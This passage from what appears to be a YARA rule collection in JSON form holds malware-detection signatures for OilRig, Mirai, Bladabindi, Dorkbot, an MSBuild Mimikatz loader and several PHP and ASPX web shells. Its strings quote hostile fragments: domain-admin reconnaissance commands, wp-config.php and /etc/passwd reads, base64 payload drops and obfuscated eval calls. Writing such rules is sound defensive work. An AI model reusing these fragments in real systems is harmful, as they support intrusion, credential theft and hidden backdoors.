https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"wss.Run \\\"powershell.exe \\\" & Chr(34) & \\\"& {(Get-Content $env:Public\\\\Libraries\\\\update.vbs) -replace '__',(Get-Random) | Set-C\" ascii\n      $x2 = \"Call Extract(UpdateVbs, wss.ExpandEnvironmentStrings(\\\"%PUBLIC%\\\") & \\\"\\\\Libraries\\\\update.vbs\\\")\" fullword ascii\n      $x3 = \"mailto:Mohammed.sarah@gratner.com\" fullword wide\n      $x4 = \"mailto:Tarik.Imam@gartner.com\" fullword wide\n      $x5 = \"Call Extract(DnsPs1, wss.ExpandEnvironmentStrings(\\\"%PUBLIC%\\\") & \\\"\\\\Libraries\\\\dns.ps1\\\")\" fullword ascii\n      $x6 = \"2dy53My5vcmcvMjAw\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 200KB and 1 of them )\n}","date":"2016-10-12 13:32:01","description":"Detects Oilrig malware samples","minimum_yara":"1.7","name":"OilRig_Malware_Campaign_Mal2_RID31A9","reference":"https://goo.gl/QMRZ8K","required_modules":[],"rule_hash":"cc98308704253795b0e7a32beba8ddf0","score":75,"tags":["DEMO","MIDDLE_EAST","FILE","MAL"]},{"author":"Florian Roth","content":"rule OilRig_Campaign_Reconnaissance_RID32E1 : DEMO MAL MIDDLE_EAST T1016 T1033 T1087 {\n   meta:\n      description = \"Detects Oilrig malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QMRZ8K\"\n      date = \"2016-10-12 14:24:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, MIDDLE_EAST, T1016, T1033, T1087\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"whoami & hostname & ipconfig /all\" ascii\n      $s2 = \"net user /domain 2>&1 & net group /domain 2>&1\" ascii\n      $s3 = \"net group \\\"domain admins\\\" /domain 2>&1 & \" ascii\n   condition: \n      ( filesize < 1KB and 1 of them )\n}","date":"2016-10-12 14:24:01","description":"Detects Oilrig malware samples","minimum_yara":"1.7","name":"OilRig_Campaign_Reconnaissance_RID32E1","reference":"https://goo.gl/QMRZ8K","required_modules":[],"rule_hash":"f56454047e0f36c902c3042b1d4172fa","score":75,"tags":["T1033","T1087","T1016","MAL","DEMO","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule OilRig_Malware_Campaign_Mal3_RID31AA : DEMO MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects Oilrig malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QMRZ8K\"\n      date = \"2016-10-12 13:32:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"(Get-Content $env:Public\\\\Libraries\\\\dns.ps1) -replace ('#'+'##'),$botid | Set-Content $env:Public\\\\Libraries\\\\dns.ps1\" fullword ascii\n      $x2 = \"Invoke-Expression ($global:myhome+'tp\\\\'+$global:filename+'.bat > '+$global:myhome+'tp\\\\'+$global:filename+'.txt')\" fullword ascii\n      $x3 = \"('00000000'+(convertTo-Base36(Get-Random -Maximum 46655)))\" fullword ascii\n   condition: \n      ( filesize < 10KB and 1 of them )\n}","date":"2016-10-12 13:32:11","description":"Detects Oilrig malware samples","minimum_yara":"1.7","name":"OilRig_Malware_Campaign_Mal3_RID31AA","reference":"https://goo.gl/QMRZ8K","required_modules":[],"rule_hash":"154c682bec6a9b548bf9620f0d4753ad","score":75,"tags":["DEMO","MIDDLE_EAST","MAL"]},{"author":"Florian Roth","content":"rule Sality_Malware_Oct16_RID2E9B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects an unspecififed malware - October 2016\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-10-08 11:21:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Hello world!\" fullword wide\n      $s2 = \"[LordPE]\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2016-10-08 11:21:41","description":"Detects an unspecififed malware - October 2016","minimum_yara":"1.7","name":"Sality_Malware_Oct16_RID2E9B","reference":"Internal Research","required_modules":[],"rule_hash":"3d3d4e84fbc3ae5f763e7fbe0b153bbd","score":80,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Unspecified_Malware_Oct16_C_RID3136 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects an unspecififed malware - October 2016\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-10-08 13:12:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"dUSER32.DLL\" fullword wide\n      $s2 = \"output.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them )\n}","date":"2016-10-08 13:12:51","description":"Detects an unspecififed malware - October 2016","minimum_yara":"1.7","name":"Unspecified_Malware_Oct16_C_RID3136","reference":"Internal Research","required_modules":[],"rule_hash":"2adf625019818624251c6d1dbc8cbe85","score":80,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Unspecified_Malware_Oct16_E_RID3138 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects unspecified Malware - October 2016\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-10-08 13:13:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"P3pORt\" fullword ascii\n      $s2 = \"msdownld.tmp\" fullword ascii\n      $s3 = \"TMP4351$.TMP\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}","date":"2016-10-08 13:13:11","description":"Detects unspecified Malware - October 2016","minimum_yara":"1.7","name":"Unspecified_Malware_Oct16_E_RID3138","reference":"Internal Research","required_modules":[],"rule_hash":"87ad2567a5091dabb40fb1877158b1ae","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Unspecified_Malware_Oct16_A_RID3134 : DEMO EXE FILE MAL T1183 {\n   meta:\n      description = \"Detects an unspecififed malware - October 2016\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-10-08 13:12:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1183\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s\\\\system32\\\\%s.dll\" fullword ascii\n      $x2 = \"%SystemRoot%\\\\System32\\\\svch%s -k nets\" fullword ascii\n      $x3 = \"\\\\\\\\.\\\\pipe\\\\96DBA249-E88E-4c47-98DC-E18E6E3E3E5A\" fullword ascii\n      $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\" fullword ascii\n      $s2 = \"boottemp.exe\" fullword ascii\n      $s3 = \"at \\\\\\\\%s %d:%d C:\\\\%s.exe\" fullword ascii\n      $s4 = \"cryptcom.dll\" fullword ascii\n      $s5 = \"Wininet.dll\" fullword ascii\n      $s6 = \"\\\\\\\\%s\\\\%s\\\\%s.exe\" fullword ascii\n      $s7 = \"%s%d.exe\" fullword ascii\n      $s8 = \"booter.exe\" fullword ascii\n      $s9 = \"\\\\\\\\%s\\\\pipe%s\" fullword ascii\n      $s10 = \"C:\\\\DelInfo.bin\" fullword ascii\n      $op0 = { ae 44 00 00 cb 44 00 00 dc 44 00 00 f5 44 00 00 } \n      $op1 = { ae 44 00 00 cb 44 00 00 dc 44 00 00 f5 44 00 00 } \n      $op2 = { ee 11 74 cf 73 0b 91 c4 c9 57 b2 d9 36 86 a5 b4 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 2 of ( $x* ) or 3 of ( $s* ) or all of ( $op* ) ) ) or ( 6 of them )\n}","date":"2016-10-08 13:12:31","description":"Detects an unspecififed malware - October 2016","minimum_yara":"1.7","name":"Unspecified_Malware_Oct16_A_RID3134","reference":"Internal Research","required_modules":[],"rule_hash":"f8e83052a02b677675403c53328332a6","score":80,"tags":["DEMO","EXE","T1183","FILE","MAL"]},{"author":"Florian Roth","content":"rule Bladabindi_Malware_B64_RID2F1E : DEMO EXE FILE MAL T1132 {\n   meta:\n      description = \"Detects Bladabindi Malware using Base64 encoded strings\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-10-08 11:43:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1132\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"XHN5c3RlbTMyXA==\" fullword ascii\n      $s2 = \"RXhlY3V0ZSBFUlJPUg==\" fullword ascii\n      $s3 = \"dHJvamFuLmV4ZQ==\" fullword ascii\n      $s4 = \"VXBkYXRlIEVSUk9S\" fullword ascii\n      $s5 = \"RG93bmxvYWQgRVJST1I=\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of them\n}","date":"2016-10-08 11:43:31","description":"Detects Bladabindi Malware using Base64 encoded strings","minimum_yara":"1.7","name":"Bladabindi_Malware_B64_RID2F1E","reference":"Internal Research","required_modules":[],"rule_hash":"7bd16a86033da5e89b23b61cfc4457a3","score":75,"tags":["DEMO","EXE","T1132","FILE","MAL"]},{"author":"Florian Roth","content":"rule Dorkbot_Injector_Malware_RID30AB : DEMO EXE FILE HKTL MAL {\n   meta:\n      description = \"Detects Darkbot Injector\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-10-08 12:49:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Enter an integer, a real number, a character and a string : \" fullword ascii\n      $s2 = \"ready to finish\" fullword ascii\n      $s3 = \"EYEnpw\" fullword ascii\n      $s4 = \"somewhere i belong\" fullword ascii\n      $s5 = \"Not all fields were assigned\" fullword ascii\n      $s6 = \"take down\" fullword ascii\n      $s7 = \"real number = %f\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 6 of them )\n}","date":"2016-10-08 12:49:41","description":"Detects Darkbot Injector","minimum_yara":"1.7","name":"Dorkbot_Injector_Malware_RID30AB","reference":"Internal Research","required_modules":[],"rule_hash":"bf7ca70ea15e0f2efa023931c793950d","score":75,"tags":["DEMO","EXE","HKTL","FILE","MAL"]},{"author":"Florian Roth","content":"rule Unspecified_Malware_Oct16_D_RID3137 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects unspecified malware - October 2016\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-10-08 13:13:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\file.exe\" fullword wide\n      $s2 = \"new.exe\" fullword wide\n      $s3 = \"passwordIterations\" fullword ascii\n      $op0 = { 10 00 12 00 1a 00 05 00 01 00 01 00 01 00 10 00 } \n      $op1 = { 41 32 00 36 00 62 00 34 00 32 00 65 00 37 00 62 } \n      $op2 = { 3c 4d 6f 64 75 6c 65 3e 00 6e 65 77 2e 65 78 65 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( all of ( $s* ) or all of ( $op* ) )\n}","date":"2016-10-08 13:13:01","description":"Detects unspecified malware - October 2016","minimum_yara":"1.7","name":"Unspecified_Malware_Oct16_D_RID3137","reference":"Internal Research","required_modules":[],"rule_hash":"087fac9f775e126e18a6c2920657a8e5","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MSBuild_Mimikatz_Execution_via_XML_RID3448 : DEMO SUSP T1003 T1075 T1097 T1127 T1178 {\n   meta:\n      description = \"Detects an XML that executes Mimikatz on an endpoint via MSBuild\"\n      author = \"Florian Roth\"\n      reference = \"https://gist.github.com/subTee/c98f7d005683e616560bda3286b6a0d8#file-katz-xml\"\n      date = \"2016-10-07 15:23:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP, T1003, T1075, T1097, T1127, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"<Project ToolsVersion=\" ascii\n      $x2 = \"</SharpLauncher>\" fullword ascii\n      $s1 = \"\\\"TVqQAAMAAAA\" ascii\n      $s2 = \"System.Convert.FromBase64String(\" ascii\n      $s3 = \".Invoke(\" ascii\n      $s4 = \"Assembly.Load(\" ascii\n      $s5 = \".CreateInstance(\" ascii\n   condition: \n      all of them\n}","date":"2016-10-07 15:23:51","description":"Detects an XML that executes Mimikatz on an endpoint via MSBuild","minimum_yara":"1.7","name":"MSBuild_Mimikatz_Execution_via_XML_RID3448","reference":"https://gist.github.com/subTee/c98f7d005683e616560bda3286b6a0d8#file-katz-xml","required_modules":[],"rule_hash":"d4c5affa1be7d808bc30775b3baa0125","score":75,"tags":["T1178","SUSP","T1097","T1075","DEMO","T1003","T1127"]},{"author":"Florian Roth","content":"rule Mirai_Botnet_Malware_RID2EF6 : DEMO FILE MAL {\n   meta:\n      description = \"Detects Mirai Botnet Malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-10-04 11:36:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"POST /cdn-cgi/\" fullword ascii\n      $x2 = \"/dev/misc/watchdog\" fullword ascii\n      $x3 = \"/dev/watchdog\" ascii\n      $x4 = \"\\\\POST /cdn-cgi/\" fullword ascii\n      $x5 = \".mdebug.abi32\" fullword ascii\n      $s1 = \"LCOGQGPTGP\" fullword ascii\n      $s2 = \"QUKLEKLUKVJOG\" fullword ascii\n      $s3 = \"CFOKLKQVPCVMP\" fullword ascii\n      $s4 = \"QWRGPTKQMP\" fullword ascii\n      $s5 = \"HWCLVGAJ\" fullword ascii\n      $s6 = \"NKQVGLKLE\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 200KB and ( ( 1 of ( $x* ) and 1 of ( $s* ) ) or 4 of ( $s* ) )\n}","date":"2016-10-04 11:36:51","description":"Detects Mirai Botnet Malware","minimum_yara":"1.7","name":"Mirai_Botnet_Malware_RID2EF6","reference":"Internal Research","required_modules":[],"rule_hash":"cdf11e88016230b4fd2b45690857b63f","score":75,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule Nishang_Webshell_RID2D6E : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detects a ASPX web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/samratashok/nishang\"\n      date = \"2016-09-11 10:31:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"psi.Arguments = \\\"-noninteractive \\\" + \\\"-executionpolicy bypass \\\" + arg;\" ascii\n      $s2 = \"output.Text += \\\"\\nPS> \\\" + console.Text + \\\"\\n\\\" + do_ps(console.Text);\" ascii\n      $s3 = \"<title>Antak Webshell</title>\" fullword ascii\n      $s4 = \"<asp:Button ID=\\\"executesql\\\" runat=\\\"server\\\" Text=\\\"Execute SQL Query\\\"\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x253C and filesize < 100KB and 1 of ( $s* ) )\n}","date":"2016-09-11 10:31:31","description":"Detects a ASPX web shell","minimum_yara":"1.7","name":"Nishang_Webshell_RID2D6E","reference":"https://github.com/samratashok/nishang","required_modules":[],"rule_hash":"fef1549a4535398f6d462156d8145681","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule WebShell_Generic_1609_A_RID2F12 : DEMO FILE GEN T1100 WEBSHELL {\n   meta:\n      description = \"Detects a PHP webshell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 11:41:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, GEN, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"return $qwery45234dws($b);\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3f3c and 1 of them )\n}","date":"2016-09-10 11:41:31","description":"Detects a PHP webshell","minimum_yara":"1.7","name":"WebShell_Generic_1609_A_RID2F12","reference":"https://github.com/bartblaze/PHP-backdoors","required_modules":[],"rule_hash":"ede500790f055d8678cd8250d10387c8","score":75,"tags":["T1100","DEMO","WEBSHELL","GEN","FILE"]},{"author":"Florian Roth","content":"rule UploadShell_98038f1efa4203432349badabad76d44337319a6_RID3657 : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 16:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"$lol = file_get_contents(\\\"../../../../../wp-config.php\\\");\" fullword ascii\n      $s6 = \"@unlink(\\\"./export-check-settings.php\\\");\" fullword ascii\n      $s7 = \"$xos = \\\"Safe-mode:[Safe-mode:\\\".$hsafemode.\\\"] \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3f3c and filesize < 6KB and ( all of ( $s* ) ) ) or ( all of them )\n}","date":"2016-09-10 16:51:41","description":"Detects a web shell","minimum_yara":"1.7","name":"UploadShell_98038f1efa4203432349badabad76d44337319a6_RID3657","reference":"https://github.com/bartblaze/PHP-backdoors","required_modules":[],"rule_hash":"36659474d392b6d55f570eec009ecefa","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule DKShell_f0772be3c95802a2d1e7a4a3f5a45dcdef6997f3_RID3552 : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 16:08:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<?php Error_Reporting(0); $s_pass = \\\"\" ascii\n      $s2 = \"$s_func=\\\"cr\\\".\\\"eat\\\".\\\"e_fun\\\".\\\"cti\\\".\\\"on\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3c0a and filesize < 300KB and all of them )\n}","date":"2016-09-10 16:08:11","description":"Detects a web shell","minimum_yara":"1.7","name":"DKShell_f0772be3c95802a2d1e7a4a3f5a45dcdef6997f3_RID3552","reference":"https://github.com/bartblaze/PHP-backdoors","required_modules":[],"rule_hash":"7955b61923d939e26295faebf5f08997","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule Unknown_8af033424f9590a15472a23cc3236e68070b952e_RID345B : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 15:27:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$check = $_SERVER['DOCUMENT_ROOT']\" fullword ascii\n      $s2 = \"$fp=fopen(\\\"$check\\\",\\\"w+\\\");\" fullword ascii\n      $s3 = \"fwrite($fp,base64_decode('\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6324 and filesize < 6KB and ( all of ( $s* ) ) ) or ( all of them )\n}","date":"2016-09-10 15:27:01","description":"Detects a web shell","minimum_yara":"1.7","name":"Unknown_8af033424f9590a15472a23cc3236e68070b952e_RID345B","reference":"https://github.com/bartblaze/PHP-backdoors","required_modules":[],"rule_hash":"69303ba6ed5d249b9b6ad47d5eadfe7a","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule DkShell_4000bd83451f0d8501a9dfad60dce39e55ae167d_RID352C : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 16:01:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"DK Shell - Took the Best made it Better..!!\" fullword ascii\n      $x2 = \"preg_replace(\\\"/.*/e\\\",\\\"\\\\x65\\\\x76\\\\x61\\\\x6C\\\\x28\\\\x67\\\\x7A\\\\x69\\\\x6E\\\\x66\\\\x6C\\\\x61\\\\x74\\\\x65\\\\x28\\\\x62\\\\x61\\\\x73\\\\x65\\\\x36\\\\x\" ascii\n      $x3 = \"echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';\" fullword ascii\n      $s1 = \"echo '<form action=\\\"\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\" name=\\\"uploader\\\" id=\\\"uploader\\\">';\" fullword ascii\n      $s9 = \"$x = $_GET[\\\"x\\\"];\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3f3c and filesize < 200KB and 1 of ( $x* ) ) or ( 3 of them )\n}","date":"2016-09-10 16:01:51","description":"Detects a web shell","minimum_yara":"1.7","name":"DkShell_4000bd83451f0d8501a9dfad60dce39e55ae167d_RID352C","reference":"https://github.com/bartblaze/PHP-backdoors","required_modules":[],"rule_hash":"5725a6161ef6ab41f3415acd28bbe171","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule WebShell_5786d7d9f4b0df731d79ed927fb5a124195fc901_RID355F : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 16:10:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"preg_replace(\\\"\\\\x2F\\\\x2E\\\\x2A\\\\x2F\\\\x65\\\",\\\"\\\\x65\\\\x76\\\\x61\\\\x6C\\\\x28\\\\x67\\\\x7A\\\\x69\\\\x6E\\\\x66\\\\x6C\\\\x61\\\\x74\\\\x65\\\\x28\\\\x62\\\\x\" ascii\n      $s2 = \"input[type=text], input[type=password]{\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6c3c and filesize < 80KB and all of them )\n}","date":"2016-09-10 16:10:21","description":"Detects a web shell","minimum_yara":"1.7","name":"WebShell_5786d7d9f4b0df731d79ed927fb5a124195fc901_RID355F","reference":"https://github.com/bartblaze/PHP-backdoors","required_modules":[],"rule_hash":"97e21ccd95557e830dcc1bf78395a769","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule Webshell_e8eaf8da94012e866e51547cd63bb996379690bf_RID3586 : DEMO FILE T1087 T1100 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 16:16:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1087, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"@exec('./bypass/ln -s /etc/passwd 1.php');\" fullword ascii\n      $x2 = \"echo \\\"<iframe src=mysqldumper/index.php width=100% height=100% frameborder=0></iframe> \\\";\" fullword ascii\n      $x3 = \"@exec('tar -xvf mysqldumper.tar.gz');\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x213c and filesize < 100KB and 1 of ( $x* ) ) or ( 2 of them )\n}","date":"2016-09-10 16:16:51","description":"Detects a web shell","minimum_yara":"1.7","name":"Webshell_e8eaf8da94012e866e51547cd63bb996379690bf_RID3586","reference":"https://github.com/bartblaze/PHP-backdoors","required_modules":[],"rule_hash":"932ada53abd9853e82637abe4315051c","score":75,"tags":["T1100","DEMO","WEBSHELL","T1087","FILE"]},{"author":"Florian Roth","content":"rule Unknown_0f06c5d1b32f4994c3b3abf8bb76d5468f105167_RID3522 : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 16:00:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$check = $_SERVER['DOCUMENT_ROOT'] . \\\"/libraries/lola.php\\\" ;\" fullword ascii\n      $s2 = \"$fp=fopen(\\\"$check\\\",\\\"w+\\\");\" fullword ascii\n      $s3 = \"fwrite($fp,base64_decode('\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6324 and filesize < 2KB and all of them )\n}","date":"2016-09-10 16:00:11","description":"Detects a web shell","minimum_yara":"1.7","name":"Unknown_0f06c5d1b32f4994c3b3abf8bb76d5468f105167_RID3522","reference":"https://github.com/bartblaze/PHP-backdoors","required_modules":[],"rule_hash":"9786d434fceed0b4472ec44c1bdf3c03","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule WSOShell_0bbebaf46f87718caba581163d4beed56ddf73a7_2_RID36D5 : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 17:12:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"$default_charset='Wi'.'ndo.'.'ws-12'.'51';\" fullword ascii\n      $s9 = \"$mosimage_session = \\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3f3c and filesize < 300KB and all of them )\n}","date":"2016-09-10 17:12:41","description":"Detects a web shell","minimum_yara":"1.7","name":"WSOShell_0bbebaf46f87718caba581163d4beed56ddf73a7_2_RID36D5","reference":"https://github.com/bartblaze/PHP-backdoors","required_modules":[],"rule_hash":"8bfc6e21b0cfcec87a84c4cdc543f10f","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule Pirpi_1609_A_RID2AE4 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Pirpi Backdoor - and other malware (generic rule)\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/igxLyF\"\n      date = \"2016-09-08 09:11:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"expand.exe1.gif\" fullword ascii\n      $c1 = \"expand.exe\" fullword ascii\n      $c2 = \"ctf.exe\" fullword ascii\n      $s1 = \"flvUpdate.exe\" fullword wide\n      $s2 = \"www.ThinkWorking.com\" fullword wide\n      $s3 = \"ctfnon.exe\" fullword ascii\n      $s4 = \"flv%d.exe\" fullword ascii\n      $s5 = 